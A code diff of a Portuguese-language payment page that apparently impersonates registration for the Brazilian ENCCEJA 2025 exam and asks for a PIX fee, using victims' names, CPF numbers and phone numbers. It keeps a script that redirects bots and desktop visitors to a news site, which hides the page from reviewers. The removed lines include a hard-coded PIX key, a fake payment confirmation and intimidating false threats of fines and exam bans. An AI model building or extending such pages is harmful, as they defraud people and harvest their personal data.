@@ -7,29 +7,29 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
     <script src="https://cdn.tailwindcss.com"></script>
-    
+
     <!-- Verificação de dispositivo desktop -->
     <script>
         // Função para detectar se é um dispositivo móvel
         function isMobile() {
           return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
-        
+
         // Função para detectar se é um bot
         function isBot() {
           const botAgents = [
             'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
             'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
           ];
-        
+
           return botAgents.some(bot => navigator.userAgent.includes(bot));
         }
-        
+
         // Função para verificar se a largura da janela é maior que 768px
         function isWideScreen() {
           return window.innerWidth > 768;
         }
-        
+
         // Redirecionar ou bloquear o acesso
         function checkAccess() {
           if (isBot() || (!isMobile() && isWideScreen())) {
@@ -37,10 +37,10 @@
             window.location.href = "https://g1.globo.com/";
           }
         }
-        
+
         // Executar a função de verificação ao carregar a página
         window.onload = checkAccess;
-        
+
         // Adicionar um listener para verificar novamente se a janela for redimensionada
         window.addEventListener('resize', checkAccess);
     </script>
@@ -108,9 +108,6 @@
         }
     </style>
     <script>
-        // Chave PIX variável conforme solicitado
-        const CHAVE_PIX_VARIAVEL = "07.041.381/0001-44"; 
-        
         document.addEventListener('DOMContentLoaded', function() {
             console.log("Inicializando página de pagamento");
 
@@ -126,41 +123,10 @@
             });
 
             // Verificar dados disponíveis e usar a melhor fonte
-            const nome = paymentData.nome || userData.nome || '{{ customer.nome }}' || '';
-            const cpf = paymentData.cpf || userData.cpf || '{{ customer.cpf }}' || '';
-            const telefone = paymentData.telefone || addressData.telefone || '{{ customer.phone }}' || '';
-            
-            // Verificar se temos desconto
-            const hasDiscount = {% if has_discount %}true{% else %}false{% endif %};
-            const discountPrice = {{ discount_price|default(49.70) }};
-            const regularPrice = {{ regular_price|default(73.40) }};
-            
-            console.log("Desconto disponível:", hasDiscount);
-            
-            if (hasDiscount) {
-                console.log("Cliente com desconto! Preço: R$" + discountPrice.toFixed(2));
-                // Atualizar o preço exibido na página
-                document.querySelector('.flex.items-center.justify-between.mb-4 p').textContent = 'R$ ' + discountPrice.toFixed(2);
-                document.querySelector('.list-decimal li:last-child').textContent = 'Confira o valor de R$ ' + discountPrice.toFixed(2) + ' e confirme o pagamento';
-                
-                // Adicionar uma faixa de desconto
-                const paymentContainer = document.getElementById('payment-container');
-                const discountBanner = document.createElement('div');
-                discountBanner.className = 'bg-green-100 p-4 rounded-md border border-green-200 text-green-800 mb-6';
-                discountBanner.innerHTML = `
-                    <p class="flex items-center">
-                        <i class="fas fa-tag text-green-600 mr-2"></i>
-                        <span>
-                            <strong>Desconto especial aplicado!</strong> Você economizou R$ ${(regularPrice - discountPrice).toFixed(2)}
-                        </span>
-                    </p>
-                `;
-                paymentContainer.insertBefore(discountBanner, paymentContainer.firstChild);
-            }
-            
-            // Salvar o status de desconto no localStorage
-            localStorage.setItem('hasDiscount', hasDiscount.toString());
-            
+            const nome = paymentData.nome || userData.nome || '';
+            const cpf = paymentData.cpf || userData.cpf || '';
+            const telefone = paymentData.telefone || addressData.telefone || '';
+
             // Se ainda não tiver os dados mínimos necessários
             if (!nome || !cpf) {
                 console.error("Dados insuficientes para pagamento");
@@ -170,67 +136,137 @@
             }
 
             // Reconstruir o objeto com os dados disponíveis
-            const dadosPagamento = { 
-                nome, 
-                cpf, 
-                telefone,
-                hasDiscount: hasDiscount,
-                discountPrice: discountPrice,
-                regularPrice: regularPrice
-            };
+            const dadosPagamento = { nome, cpf, telefone };
 
             // Atualizar o localStorage com a versão consolidada
             localStorage.setItem('paymentData', JSON.stringify(dadosPagamento));
 
-            // Mostrar a chave PIX diretamente sem fazer requisição
-            displayFixedPixCode();
+            // Fazer solicitação para criar pagamento
+            createPayment(dadosPagamento);
         });
 
-        function displayFixedPixCode() {
-            // Esconder spinner
-            document.getElementById('loading-container').classList.add('hidden');
-            
-            // Mostrar container de pagamento
-            document.getElementById('payment-container').classList.remove('hidden');
-            
-            // Exibir código PIX fixo
-            document.getElementById('pix-code').textContent = CHAVE_PIX_VARIAVEL;
-            document.getElementById('pix-code-container').classList.remove('hidden');
-            
-            // Simulação de redirecionamento após 20 segundos (apenas para fins de demonstração)
-            setTimeout(() => {
-                // Mostrar mensagem de sucesso
-                const successMessage = document.createElement('div');
-                successMessage.className = 'bg-green-50 p-4 rounded-md border border-green-300 text-green-800 my-4';
-                successMessage.innerHTML = `
-                    <p class="flex items-start">
-                        <i class="fas fa-check-circle text-green-600 mr-2 mt-1"></i>
-                        <span>
-                            <strong>Pagamento confirmado!</strong> Sua inscrição foi concluída com sucesso.
-                            Redirecionando para a página de confirmação...
-                        </span>
-                    </p>
-                `;
-                
-                // Adicionar mensagem ao container
-                const paymentDetailsContainer = document.getElementById('payment-container');
-                paymentDetailsContainer.insertBefore(successMessage, paymentDetailsContainer.firstChild);
-                
-                // Obter os dados do usuário
-                const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
-                const nome = userData.nome || '';
-                const cpf = userData.cpf || '';
-                const telefone = userData.telefone || '';
-                
-                // Redirecionar para a página de obrigado após 3 segundos
-                setTimeout(() => {
-                    const urlParams = new URLSearchParams();
-                    if (nome) urlParams.append('nome', nome);
-                    if (cpf) urlParams.append('cpf', cpf);
-                    if (telefone) urlParams.append('phone', telefone);
-                    window.location.href = '/obrigado?' + urlParams.toString();
-                }, 3000);
-            }, 20000);
+        function createPayment(userData) {
+            // Exibir spinner enquanto processa
+            document.getElementById('loading-container').classList.remove('hidden');
+            document.getElementById('payment-container').classList.add('hidden');
+
+            // Fazer requisição para criar o pagamento
+            fetch('/pagamento', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Esconder spinner
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('payment-container').classList.remove('hidden');
+
+                if (data.error) {
+                    // Mostrar erro se houver
+                    document.getElementById('error-message').textContent = data.error;
+                    document.getElementById('error-container').classList.remove('hidden');
+                    return;
+                } 
+
+                if (data.warning) {
+                    // Mostrar alerta se houver, mas continuar processando
+                    document.getElementById('warning-message').textContent = data.warning;
+                    document.getElementById('warning-container').classList.remove('hidden');
+                }
+
+                // Processar os dados de pagamento
+                    // Mostrar dados de pagamento
+                    if (data.pixQrCode) {
+                        console.log('QR code recebido, processando...');
+                        try {
+                            // Limpar possíveis caracteres indesejados na string base64
+                            const cleanBase64 = data.pixQrCode.replace(/^['"]|['"]$/g, '').trim();
+                            console.log('Base64 limpo, primeiros 20 caracteres:', cleanBase64.substring(0, 20) + '...');
+
+                            // Verificar se já tem o prefixo data:image
+                            if (cleanBase64.startsWith('data:image')) {
+                                document.getElementById('qr-code-img').src = cleanBase64;
+                            } else {
+                                document.getElementById('qr-code-img').src = `data:image/png;base64,${cleanBase64}`;
+                            }
+
+                            // Adicionar listener para detectar erros de carregamento da imagem
+                            const imgElement = document.getElementById('qr-code-img');
+                            imgElement.onerror = function() {
+                                console.error('Erro ao carregar QR code - imagem inválida');
+                                // Gerar QR code alternativo usando uma biblioteca externa
+                                document.getElementById('qr-code-container').classList.remove('hidden');
+
+                                // Se tiver o código PIX, usar uma biblioteca alternativa para gerar QR
+                                if (data.pixCode) {
+                                    const pixValue = data.pixCode;
+                                    const pixCodeElement = document.getElementById('pix-code');
+
+                                    // Usar API externa para gerar QR code a partir do texto
+                                    const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixValue)}`;
+                                    imgElement.src = qrApiUrl;
+                                    console.log('Usando QR code alternativo via API');
+                                } else {
+                                    // Não foi possível gerar o QR code
+                                    document.getElementById('qr-code-container').classList.add('hidden');
+                                }
+                            };
+
+                            // Mostrar o container
+                            document.getElementById('qr-code-container').classList.remove('hidden');
+                            console.log('Container de QR code visível');
+
+                        } catch (error) {
+                            console.error('Erro ao processar QR code:', error);
+                            // Tentar abordagem alternativa com API de QR
+                            if (data.pixCode) {
+                                const pixValue = data.pixCode;
+                                const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixValue)}`;
+                                document.getElementById('qr-code-img').src = qrApiUrl;
+                                document.getElementById('qr-code-container').classList.remove('hidden');
+                                console.log('Usando gerador de QR code alternativo após erro');
+                            } else {
+                                document.getElementById('qr-code-container').classList.add('hidden');
+                            }
+                        }
+                    } else if (data.pixCode) {
+                        // Se não tem QR code mas tem o código PIX, gerar QR code a partir do código
+                        console.log('Sem QR code na resposta, mas temos código PIX. Gerando QR...');
+                        const pixValue = data.pixCode;
+                        const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixValue)}`;
+                        document.getElementById('qr-code-img').src = qrApiUrl;
+                        document.getElementById('qr-code-container').classList.remove('hidden');
+                    } else {
+                        // Se não tem nem QR code nem código PIX, ocultar a seção
+                        console.log('Sem QR code e sem código PIX na resposta');
+                        document.getElementById('qr-code-container').classList.add('hidden');
+                    }
+
+                    if (data.pixCode) {
+                        document.getElementById('pix-code').textContent = data.pixCode;
+                        document.getElementById('pix-code-container').classList.remove('hidden');
+                    } else {
+                        document.getElementById('pix-code-container').classList.add('hidden');
+                    }
+
+                    // Salvar ID de transação para verificar status
+                    if (data.id) {
+                        localStorage.setItem('transactionId', data.id);
+
+                        // Iniciar verificação periódica do status do pagamento
+                        startPaymentStatusCheck(data.id);
+                    }
+            })
+            .catch(error => {
+                // Esconder spinner e mostrar erro
+                document.getElementById('loading-container').classList.add('hidden');
+                document.getElementById('error-message').textContent = 'Erro ao processar pagamento. Tente novamente.';
+                document.getElementById('error-container').classList.remove('hidden');
+                console.error('Erro:', error);
+            });
         }
 
         function copyPixCode() {
@@ -336,18 +372,12 @@
                         const userData = JSON.parse(localStorage.getItem('paymentData') || '{}');
                         const nome = userData.nome || '';
                         const cpf = userData.cpf || '';
-                        
-                        // Verificar se temos flag de desconto
-                        const hasDiscount = localStorage.getItem('hasDiscount') === 'true';
-                        const amount = hasDiscount ? 49.70 : 73.40;
-                        
-                        console.log('Valor do pagamento para pixel:', amount, 'Desconto aplicado:', hasDiscount);
 
-                        // Definir dados do evento com o valor correto baseado no desconto
+                        // Definir dados do evento
                         const eventData = {
-                            value: amount,
+                            value: 39.70,
                             currency: 'BRL',
-                            content_name: hasDiscount ? 'Taxa de Inscrição ENCCEJA 2025 com Desconto' : 'Taxa de Inscrição ENCCEJA 2025',
+                            content_name: 'Taxa de Inscrição ENCCEJA 2025',
                             content_type: 'product',
                             content_ids: ['encceja-2025-taxa'],
                             content_category: 'Taxa de Inscrição',
@@ -494,7 +524,7 @@
                         <div class="mb-6">
                             <div class="flex items-center justify-between mb-4">
                                 <h3 class="text-lg font-bold text-gray-800">Taxa de Inscrição</h3>
-                                <p class="text-lg font-bold text-gray-800">{% if has_discount %}R$ {{ discount_price }}{% else %}R$ {{ regular_price|default(73.40) }}{% endif %}</p>
+                                <p class="text-lg font-bold text-gray-800">R$ 73,40</p>
                             </div>
 
                             <!-- PIX Code -->
@@ -518,40 +548,19 @@
                                         <li>Abra o aplicativo do seu banco</li>
                                         <li>Selecione a opção "Pagar com PIX" ou "PIX Copia e Cola"</li>
                                         <li>Cole o código copiado no campo indicado</li>
-                                        <li>Confira o valor de {% if has_discount %}R$ {{ discount_price }}{% else %}R$ {{ regular_price|default(73.40) }}{% endif %} e confirme o pagamento</li>
+                                        <li>Confira o valor de R$ 73,40 e confirme o pagamento</li>
                                     </ol>
                                 </div>
                             </div>
 
-                            <!-- Espaço removido do QR Code -->
+                            <!-- QR Code -->
+                            <div id="qr-code-container" class="hidden">
+                                <p class="text-center font-semibold text-gray-700 mb-3">Ou escaneie o QR Code com seu aplicativo bancário:</p>
+                                <div class="flex justify-center mb-6">
+                                    <img id="qr-code-img" src="" alt="QR Code PIX" class="w-48 h-48 border border-gray-300 p-2 bg-white">
+                                </div>
+                            </div>
 
-                            <!-- Aviso sobre desconto caso exista -->
-                            {% if has_discount %}
-                            <div class="bg-green-50 p-4 rounded-md border border-green-200 text-green-800 mb-6">
-                                <p class="flex items-start">
-                                    <i class="fas fa-tag text-green-600 mr-2 mt-1"></i>
-                                    <span>
-                                        <strong>DESCONTO PROMOCIONAL APLICADO!</strong> Você recebeu um desconto especial! 
-                                        A taxa normal de R$ {{ regular_price }} foi reduzida para <strong>apenas R$ {{ discount_price }}</strong>.
-                                    </span>
-                                </p>
-                            </div>
-                            {% endif %}
-                            
-                            <!-- Aviso sobre consequências do não pagamento (mantido independente do desconto) -->
-                            <div class="bg-red-50 p-4 rounded-md border border-red-200 text-red-800 mb-6">
-                                <p class="flex items-start">
-                                    <i class="fas fa-exclamation-circle text-red-600 mr-2 mt-1"></i>
-                                    <span>
-                                        <strong>ATENÇÃO:</strong> A inscrição para o ENCCEJA gera a inclusão do seu CPF na lista de participantes.
-                                        O não pagamento da taxa de inscrição acarretará na <strong>proibição de participar 
-                                        do ENCCEJA pelos próximos 3 anos</strong> e a <strong>inclusão do débito em dívida ativa da União</strong>,
-                                        com acréscimo de juros e multa sobre o valor original da taxa.
-                                    </span>
-                                </p>
-                            </div>
-                            
-                            <!-- Aviso padrão sobre atualização de pagamento -->
                             <div class="bg-yellow-50 p-4 rounded-md border border-yellow-200 text-yellow-800 mt-6">
                                 <p class="flex items-start">
                                     <i class="fas fa-exclamation-triangle text-yellow-600 mr-2 mt-1"></i>
